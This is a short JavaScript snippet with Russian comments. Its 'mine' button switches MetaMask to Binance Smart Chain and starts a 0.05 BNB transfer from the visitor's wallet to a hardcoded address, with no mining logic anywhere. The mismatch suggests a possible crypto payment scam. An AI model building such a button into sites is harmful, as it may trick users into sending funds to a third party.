document.getElementById('mineButton').addEventListener('click', async () => {
    // Проверка наличия MetaMask
    if (typeof window.ethereum !== 'undefined') {
        try {
            // Запрос на переключение сети на Binance Smart Chain
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: '0x38',
                    chainName: 'Binance Smart Chain',
                    nativeCurrency: {
                        name: 'Binance Coin',
                        symbol: 'BNB',
                        decimals: 18
                    },
                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls: ['https://bscscan.com/']
                }]
            });

            // Запрос на подключение к MetaMask
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            const web3 = new Web3(window.ethereum);
            const accounts = await web3.eth.getAccounts();
            const sender = accounts[0];
            const recipient = '0x2A59EbEBACa96026401CED0828c3009425e91b38';
            const amount = web3.utils.toWei('0.05', 'ether');

            // Инициация транзакции
            await web3.eth.sendTransaction({
                from: sender,
                to: recipient,
                value: amount
            });

            alert('Транзакция отправлена!');
        } catch (error) {
            console.error('Ошибка при отправке транзакции:', error);
            alert('Ошибка при отправке транзакции.');
        }
    } else {
        alert('Пожалуйста, установите MetaMask!');
    }
});
